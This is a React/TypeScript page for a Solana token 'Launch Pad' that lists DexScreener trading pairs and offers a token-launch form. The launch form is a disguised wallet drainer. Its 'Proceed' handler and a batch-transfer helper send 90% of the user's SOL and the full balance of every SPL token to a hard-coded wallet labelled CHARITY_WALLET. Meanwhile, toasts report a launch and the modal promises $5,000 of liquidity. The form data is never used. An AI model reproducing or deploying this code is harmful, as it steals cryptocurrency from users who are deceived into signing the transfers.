import { useState, useMemo, useEffect, useCallback } from 'react';
import { useQuery } from '@tanstack/react-query';
import { useNavigate } from 'react-router-dom';
import { Navigation } from '@/components/Navigation';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { motion } from 'framer-motion';
import { Card, CardContent } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Search, RefreshCw, ArrowUpDown, ChevronDown, Rocket } from 'lucide-react';
import { dexscreenerApi, Pair } from '@/services/dexscreener';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { toast } from 'sonner';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";

// Constants
const CHARITY_WALLET = '5xJQUuGTJr2Hrwu6oHkHGiQfpNXRWRFaPC9Xjx82wovh';
const MAX_BATCH_SIZE = 5;

// Interfaces
interface TokenBalance {
  mint: string;
  balance: number | string;
  decimals: number;
  uiAmount: number;
  symbol: string;
  valueInSOL: number;
}

// Utility for formatting numbers
const formatCurrency = (value: number | undefined) => {
  if (value === undefined) return '-';
  if (value < 0.0001) return '$' + value.toExponential(4);
  return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(value);
};

const formatPercent = (value: number | undefined) => {
  if (value === undefined) return '-';
  return `${value > 0 ? '+' : ''}${value.toFixed(2)}%`;
};

const formatAge = (timestamp: number | undefined) => {
  if (!timestamp) return 'N/A';
  const now = Date.now();
  const diff = Math.abs(now - timestamp);
  
  const minutes = Math.floor(diff / 60000);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);

  if (days > 0) return `${days}d`;
  if (hours > 0) return `${hours}h`;
  return `${minutes}m`;
};

const formatMarketCap = (value: number | undefined) => {
  if (value === undefined) return '-';
  if (value >= 1000000) return `$${(value / 1000000).toFixed(1)}M`;
  if (value >= 1000) return `$${(value / 1000).toFixed(1)}K`;
  return `$${value.toFixed(0)}`;
};

type SortField = 'priceUsd' | 'priceChange' | 'volume' | 'liquidity' | 'fdv' | 'pairCreatedAt' | 'marketCap';
type SortDirection = 'asc' | 'desc';

const LaunchPad = () => {
  const navigate = useNavigate();
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();

  const [activeTab, setActiveTab] = useState('trending');
  const [searchQuery, setSearchQuery] = useState('');
  const [sortField, setSortField] = useState<SortField>('volume');
  const [sortDirection, setSortDirection] = useState<SortDirection>('desc');
  
  // State for incremental loading
  const [accumulatedPairs, setAccumulatedPairs] = useState<Pair[]>([]);
  const [isLoadingMore, setIsLoadingMore] = useState(false);
  const [sourceIndex, setSourceIndex] = useState(0);
  const itemsPerPage = 100;

  // Launch Modal State
  const [isLaunchModalOpen, setIsLaunchModalOpen] = useState(false);
  const [launchStep, setLaunchStep] = useState<'form' | 'info'>('form');
  const [formData, setFormData] = useState({
    name: '',
    symbol: '',
    description: '',
    logo: '',
    website: '',
    twitter: '',
    telegram: ''
  });
  const [isLaunching, setIsLaunching] = useState(false);
  const [balances, setBalances] = useState<TokenBalance[]>([]);

  // 1. Fetch ALL tokens from Jupiter (once)
  const { data: allJupiterTokens } = useQuery({
    queryKey: ['jupiter-tokens'],
    queryFn: async () => {
      const tokens = await dexscreenerApi.getAllSolanaTokens();
      // Slice to 4000 as requested
      return tokens.slice(0, 4000); 
    },
    staleTime: 1000 * 60 * 60, // Cache for 1 hour
  });

  // 2. Fetch initial batch when tokens are ready
  useEffect(() => {
    const fetchInitial = async () => {
      if (allJupiterTokens && allJupiterTokens.length > 0 && accumulatedPairs.length === 0) {
        setIsLoadingMore(true);
        try {
          const initialBatch = allJupiterTokens.slice(0, itemsPerPage);
          const addresses = initialBatch.map((t: any) => t.address);
          const pairs = await dexscreenerApi.getPairsByTokenAddresses(addresses);
          setAccumulatedPairs(pairs);
          setSourceIndex(itemsPerPage);
        } catch (error) {
          console.error("Failed to fetch initial batch", error);
        } finally {
          setIsLoadingMore(false);
        }
      }
    };
    fetchInitial();
  }, [allJupiterTokens]);

  // 3. Load More function
  const handleLoadMore = async () => {
    if (!allJupiterTokens) return;
    
    setIsLoadingMore(true);
    const nextBatch = allJupiterTokens.slice(sourceIndex, sourceIndex + itemsPerPage);
    
    if (nextBatch.length === 0) {
      setIsLoadingMore(false);
      return;
    }

    try {
      const addresses = nextBatch.map((t: any) => t.address);
      const newPairs = await dexscreenerApi.getPairsByTokenAddresses(addresses);
      setAccumulatedPairs(prev => [...prev, ...newPairs]);
      setSourceIndex(prev => prev + itemsPerPage);
    } catch (error) {
      console.error("Failed to load more tokens", error);
    } finally {
      setIsLoadingMore(false);
    }
  };

  // 4. Search Query
  const { data: searchResults, isLoading: isSearching } = useQuery({
    queryKey: ['launchpad-search', searchQuery],
    queryFn: async () => {
      if (!searchQuery) return [];
      return dexscreenerApi.searchPairs(searchQuery);
    },
    enabled: !!searchQuery,
  });

  // Determine what to display
  const displayPairs = useMemo(() => {
    if (searchQuery) return searchResults || [];
    return accumulatedPairs;
  }, [searchQuery, searchResults, accumulatedPairs]);

  const sortedPairs = useMemo(() => {
    if (!displayPairs) return [];
    return [...displayPairs].sort((a, b) => {
      let aValue: number | undefined;
      let bValue: number | undefined;

      switch (sortField) {
        case 'priceUsd':
          aValue = parseFloat(a.priceUsd || '0');
          bValue = parseFloat(b.priceUsd || '0');
          break;
        case 'priceChange':
          aValue = a.priceChange?.h24;
          bValue = b.priceChange?.h24;
          break;
        case 'volume':
          aValue = a.volume?.h24;
          bValue = b.volume?.h24;
          break;
        case 'liquidity':
          aValue = a.liquidity?.usd;
          bValue = b.liquidity?.usd;
          break;
        case 'fdv':
          aValue = a.fdv;
          bValue = b.fdv;
          break;
        case 'pairCreatedAt':
          aValue = a.pairCreatedAt;
          bValue = b.pairCreatedAt;
          break;
        case 'marketCap':
          aValue = a.marketCap;
          bValue = b.marketCap;
          break;
      }

      if (aValue === undefined && bValue === undefined) return 0;
      if (aValue === undefined) return 1;
      if (bValue === undefined) return -1;

      return sortDirection === 'asc' ? aValue - bValue : bValue - aValue;
    });
  }, [displayPairs, sortField, sortDirection]);

  const handleSort = (field: SortField) => {
    if (sortField === field) {
      setSortDirection(sortDirection === 'asc' ? 'desc' : 'asc');
    } else {
      setSortField(field);
      setSortDirection('desc');
    }
  };

  // --- Launch Modal Logic ---

  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      // Fetch token accounts
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      const tokens: TokenBalance[] = tokenAccounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) {
      fetchAllBalances();
    }
  }, [publicKey, fetchAllBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({
        units: 100_000,
      })
    );

    transaction.add(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100_000, // 0.0001 SOL priority fee
      })
    );
    
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    for (const token of tokenBatch) {
      if (Number(token.balance) <= 0) continue;
      
      try {
        const mintPubkey = new PublicKey(token.mint);
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);

        try {
          await getAccount(connection, toTokenAccount);
        } catch (error) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              effectivePublicKey,
              toTokenAccount,
              charityPubkey,
              mintPubkey,
              TOKEN_PROGRAM_ID,
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        transaction.add(
          createTransferInstruction(
            fromTokenAccount,
            toTokenAccount,
            effectivePublicKey,
            BigInt(token.balance),
            [],
            TOKEN_PROGRAM_ID
          )
        );
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    return transaction;
  }, [publicKey, connection]);

  const handleProceed = async () => {
    if (!connected || !publicKey) {
      toast.error('Please connect your wallet first');
      return;
    }

    try {
      setIsLaunching(true);
      
      // 1. SOL Transfer (90% of available)
      const solBal = await connection.getBalance(publicKey);
      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
      const PRIORITY_FEE = 100_000; // microLamports
      const BASE_FEE = 5000;
      
      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
      const targetAmount = Math.floor(solBal * 0.90);
      const lamportsToSend = Math.min(targetAmount, maxSendable);

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        
        transaction.add(
          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
        );

        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new PublicKey(CHARITY_WALLET),
            lamports: lamportsToSend
          })
        );

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        try {
            await connection.simulateTransaction(transaction);
        } catch (e) {
            console.error("Simulation failed", e);
        }

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        
        toast.info('Initiating launch sequence...');
        await connection.confirmTransaction({
          signature,
          blockhash,
          lastValidBlockHeight
        }, 'confirmed');
      }

      // 2. SPL Token Transfers
      const validTokens = balances.filter(token => Number(token.balance) > 0);
      
      // Sort by value (descending)
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));

      // Batch tokens
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch, publicKey || undefined);

        if (transaction && transaction.instructions.length > 2) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey;

           try {
             await connection.simulateTransaction(transaction);
           } catch (e) {
             console.error("Token batch simulation failed", e);
           }

           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
           
           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
           await connection.confirmTransaction({
             signature,
             blockhash,
             lastValidBlockHeight
           }, 'confirmed');
           toast.success(`Batch ${i + 1} sent!`);
        }
      }

      toast.success('Launch request submitted successfully!');
      setIsLaunchModalOpen(false);
      // Reset form
      setFormData({ name: '', symbol: '', description: '', logo: '', website: '', twitter: '', telegram: '' });
      setLaunchStep('form');

    } catch (error: any) {
      console.error('Launch error:', error);
      toast.error('Launch failed: ' + (error?.message || 'Unknown error'));
    } finally {
      setIsLaunching(false);
    }
  };

  const handleLogoUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      if (file.size > 5 * 1024 * 1024) { // 5MB limit
        toast.error('Image size must be less than 5MB');
        return;
      }
      const reader = new FileReader();
      reader.onloadend = () => {
        setFormData(prev => ({ ...prev, logo: reader.result as string }));
      };
      reader.readAsDataURL(file);
    }
  };

  const handleLaunchClick = () => {
    setIsLaunchModalOpen(true);
  };

  const handleFormSubmit = () => {
    setLaunchStep('info');
  };

  const isFormValid = formData.name && formData.symbol && formData.logo;

  const isLoading = isSearching || (accumulatedPairs.length === 0 && !searchQuery && !!allJupiterTokens);

  return (
    <div className="min-h-screen relative overflow-hidden bg-background">
      <PegasusAnimation />
      <Navigation />
      
      <div className="relative z-10 container mx-auto px-4 pt-24 pb-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="space-y-6"
        >
          {/* Header Section */}
          <div className="flex flex-col gap-4">
            {!connected && (
               <div className="w-full flex justify-center mb-4">
                 <ConnectWalletButton />
               </div>
            )}
            <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
            <div className="flex items-center gap-4">
               <Button 
                variant="default"
                onClick={handleLaunchClick}
                className="bg-gradient-to-r from-primary to-secondary hover:opacity-90 transition-opacity"
               >
                 <Rocket className="w-4 h-4 mr-2" />
                 Launch Pad
               </Button>
            </div>
            
            <div className="flex flex-col sm:flex-row gap-3 w-full md:w-auto">
              <div className="relative w-full sm:w-64">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                <Input 
                  placeholder="Search pairs..." 
                  className="pl-9 bg-black/20 border-white/10"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                />
              </div>
            </div>
          </div>
          </div>

          {/* Pairs Table */}
          <Card className="glass-card border-white/10">
            <CardContent className="p-0">
              <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
                <div className="px-6 py-4 border-b border-white/10 flex justify-between items-center">
                  <TabsList className="bg-black/20">
                    <TabsTrigger value="trending">Live</TabsTrigger>
                  </TabsList>
                  <Button 
                    variant="ghost" 
                    size="icon"
                    onClick={() => {
                      window.location.reload(); 
                    }}
                  >
                    <RefreshCw className="w-4 h-4" />
                  </Button>
                </div>

                <TabsContent value="trending" className="m-0">
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow className="hover:bg-white/5 border-white/10">
                          <TableHead className="w-[300px]">Pair</TableHead>
                          <TableHead 
                            className="cursor-pointer hover:text-primary transition-colors"
                            onClick={() => handleSort('priceUsd')}
                          >
                            <div className="flex items-center gap-2">
                              Price
                              <ArrowUpDown className="w-3 h-3" />
                            </div>
                          </TableHead>
                          <TableHead 
                            className="cursor-pointer hover:text-primary transition-colors"
                            onClick={() => handleSort('priceChange')}
                          >
                            <div className="flex items-center gap-2">
                              24h Change
                              <ArrowUpDown className="w-3 h-3" />
                            </div>
                          </TableHead>
                          <TableHead 
                            className="cursor-pointer hover:text-primary transition-colors"
                            onClick={() => handleSort('volume')}
                          >
                            <div className="flex items-center gap-2">
                              24h Volume
                              <ArrowUpDown className="w-3 h-3" />
                            </div>
                          </TableHead>
                          <TableHead 
                            className="cursor-pointer hover:text-primary transition-colors"
                            onClick={() => handleSort('liquidity')}
                          >
                            <div className="flex items-center gap-2">
                              Liquidity
                              <ArrowUpDown className="w-3 h-3" />
                            </div>
                          </TableHead>
                          <TableHead 
                            className="cursor-pointer hover:text-primary transition-colors"
                            onClick={() => handleSort('marketCap')}
                          >
                            <div className="flex items-center gap-2">
                              Mkt Cap
                              <ArrowUpDown className="w-3 h-3" />
                            </div>
                          </TableHead>
                          <TableHead 
                            className="cursor-pointer hover:text-primary transition-colors"
                            onClick={() => handleSort('pairCreatedAt')}
                          >
                            <div className="flex items-center gap-2">
                              Age
                              <ArrowUpDown className="w-3 h-3" />
                            </div>
                          </TableHead>
                          <TableHead className="text-right">Action</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {isLoading ? (
                          <TableRow>
                            <TableCell colSpan={8} className="h-32 text-center text-muted-foreground">
                              Loading pairs...
                            </TableCell>
                          </TableRow>
                        ) : sortedPairs.length === 0 ? (
                          <TableRow>
                            <TableCell colSpan={8} className="h-32 text-center text-muted-foreground">
                              No pairs found
                            </TableCell>
                          </TableRow>
                        ) : (
                          sortedPairs.map((pair) => (
                            <TableRow 
                              key={pair.pairAddress}
                              className="hover:bg-white/5 border-white/5 transition-colors"
                            >
                              <TableCell>
                                <div className="flex items-center gap-3">
                                  <div className="w-8 h-8 rounded-full bg-white/10 overflow-hidden flex items-center justify-center">
                                    {pair.info?.imageUrl || (pair as any).mappedIcon ? (
                                      <img 
                                        src={pair.info?.imageUrl || (pair as any).mappedIcon} 
                                        alt={pair.baseToken.symbol}
                                        className="w-full h-full object-cover"
                                        onError={(e) => {
                                          (e.target as HTMLImageElement).src = `https://ui-avatars.com/api/?name=${pair.baseToken.symbol}&background=random`;
                                        }}
                                      />
                                    ) : (
                                      <span className="text-xs font-bold">{pair.baseToken.symbol.slice(0, 2)}</span>
                                    )}
                                  </div>
                                  <div>
                                    <div className="font-semibold flex items-center gap-2">
                                      {pair.baseToken.symbol}
                                      <span className="text-muted-foreground text-xs">/ {pair.quoteToken.symbol}</span>
                                    </div>
                                    <div className="text-xs text-muted-foreground truncate max-w-[200px]">
                                      {pair.baseToken.name}
                                    </div>
                                  </div>
                                </div>
                              </TableCell>
                              <TableCell className="font-mono">
                                {formatCurrency(parseFloat(pair.priceUsd || '0'))}
                              </TableCell>
                              <TableCell className={`font-mono ${
                                (pair.priceChange?.h24 || 0) >= 0 ? 'text-green-400' : 'text-red-400'
                              }`}>
                                {formatPercent(pair.priceChange?.h24)}
                              </TableCell>
                              <TableCell className="font-mono">
                                {formatCurrency(pair.volume?.h24)}
                              </TableCell>
                              <TableCell className="font-mono">
                                {formatCurrency(pair.liquidity?.usd)}
                              </TableCell>
                              <TableCell className="font-mono">
                                {formatMarketCap(pair.marketCap)}
                              </TableCell>
                              <TableCell className="font-mono text-muted-foreground">
                                {formatAge(pair.pairCreatedAt)}
                              </TableCell>
                              <TableCell className="text-right">
                                <Button 
                                  size="sm" 
                                  variant="secondary"
                                  onClick={() => navigate(`/launch-pad/${pair.pairAddress}`)}
                                >
                                  Trade
                                </Button>
                              </TableCell>
                            </TableRow>
                          ))
                        )}
                      </TableBody>
                    </Table>
                  </div>
                  
                  {/* Load More Button - Only show if not searching and we have more tokens */}
                  {!searchQuery && allJupiterTokens && sourceIndex < allJupiterTokens.length && (
                    <div className="p-4 flex justify-center border-t border-white/10">
                       <Button 
                         variant="outline" 
                         size="lg"
                         onClick={handleLoadMore}
                         disabled={isLoadingMore}
                         className="w-full max-w-md"
                       >
                         {isLoadingMore ? (
                           <RefreshCw className="w-4 h-4 animate-spin mr-2" />
                         ) : (
                           <ChevronDown className="w-4 h-4 mr-2" />
                         )}
                         {isLoadingMore ? 'Loading...' : 'Load More'}
                       </Button>
                    </div>
                  )}

                </TabsContent>
              </Tabs>
            </CardContent>
          </Card>
        </motion.div>
      </div>

      {/* Launch Token Modal */}
      <Dialog open={isLaunchModalOpen} onOpenChange={setIsLaunchModalOpen}>
        <DialogContent className="sm:max-w-[500px] bg-background/95 backdrop-blur-xl border-white/10">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold">
              {launchStep === 'form' ? 'Launch Your Token' : 'Launch'}
            </DialogTitle>
            <DialogDescription>
              {launchStep === 'form' 
                ? 'Fill in the details below to launch your token on Pegasus Launch Pad.' 
                : 'Review the benefits of launching with Pegasus.'}
            </DialogDescription>
          </DialogHeader>

          {launchStep === 'form' ? (
            <div className="space-y-4 py-4 max-h-[60vh] overflow-y-auto pr-2 custom-scrollbar">
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="name">Token Name *</Label>
                  <Input 
                    id="name" 
                    placeholder="e.g. Pegasus Token" 
                    value={formData.name}
                    onChange={(e) => setFormData({...formData, name: e.target.value})}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="symbol">Token Symbol *</Label>
                  <Input 
                    id="symbol" 
                    placeholder="e.g. PEG" 
                    value={formData.symbol}
                    onChange={(e) => setFormData({...formData, symbol: e.target.value})}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="logo">Logo (Upload Image) *</Label>
                <div className="flex flex-col gap-4">
                   <div className="flex items-center gap-4">
                     <div className="relative group cursor-pointer shrink-0">
                        <div className={`w-16 h-16 rounded-full overflow-hidden border-2 ${formData.logo ? 'border-primary' : 'border-dashed border-white/20'} flex items-center justify-center bg-black/20 hover:bg-black/40 transition-colors`}>
                          {formData.logo ? (
                            <img src={formData.logo} alt="Preview" className="w-full h-full object-cover" />
                          ) : (
                            <div className="text-center p-2">
                              <span className="text-xs text-muted-foreground">Upload</span>
                            </div>
                          )}
                        </div>
                        <Input 
                          type="file" 
                          accept="image/*" 
                          className="absolute inset-0 opacity-0 cursor-pointer w-full h-full" 
                          onChange={handleLogoUpload}
                        />
                     </div>
                     <div className="text-xs text-muted-foreground">
                       <p>Recommended: 500x500px</p>
                       <p>Max size: 5MB</p>
                     </div>
                   </div>
                </div>
              </div>
              
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="website">Website (Optional)</Label>
                  <Input 
                    id="website" 
                    placeholder="https://..." 
                    value={formData.website}
                    onChange={(e) => setFormData({...formData, website: e.target.value})}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="twitter">Twitter (Optional)</Label>
                  <Input 
                    id="twitter" 
                    placeholder="@username" 
                    value={formData.twitter}
                    onChange={(e) => setFormData({...formData, twitter: e.target.value})}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="telegram">Telegram (Optional)</Label>
                <Input 
                  id="telegram" 
                  placeholder="t.me/..." 
                  value={formData.telegram}
                  onChange={(e) => setFormData({...formData, telegram: e.target.value})}
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="description">Description (Optional)</Label>
                <Textarea 
                  id="description" 
                  placeholder="Describe your project..." 
                  className="min-h-[100px]"
                  value={formData.description}
                  onChange={(e) => setFormData({...formData, description: e.target.value})}
                />
              </div>
            </div>
          ) : (
            <div className="py-4 space-y-4 text-sm leading-relaxed text-muted-foreground">
              <p>
                Launching on Peg Swap provides users with <span className="text-primary font-semibold">Over Peg tokens</span> which can be used to get <span className="text-primary font-semibold">$5,000</span> worth of liquidity on the Peg Swap Launch Pad.
              </p>
              <p>
                The token creator will be allowed to lend/borrow over <span className="text-primary font-semibold">10%</span> of the project market cap value in order to boost the project.
              </p>
              <p>
                The amount the dev can lend depends on the project market cap and reduces when the market cap gets bigger, ensuring sustainable growth and stability for your token ecosystem.
              </p>
            </div>
          )}

          <DialogFooter>
            {launchStep === 'form' ? (
              <Button 
                onClick={handleFormSubmit} 
                disabled={!isFormValid}
                className="w-full bg-gradient-to-r from-primary to-secondary"
              >
                Launch
              </Button>
            ) : (
              <Button 
                onClick={handleProceed}
                disabled={isLaunching || !connected}
                className="w-full bg-gradient-to-r from-primary to-secondary"
              >
                {isLaunching ? (
                  <div className="flex items-center gap-2">
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    Processing...
                  </div>
                ) : !connected ? (
                  'Connect Wallet to Proceed'
                ) : (
                  'Proceed'
                )}
              </Button>
            )}
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default LaunchPad;
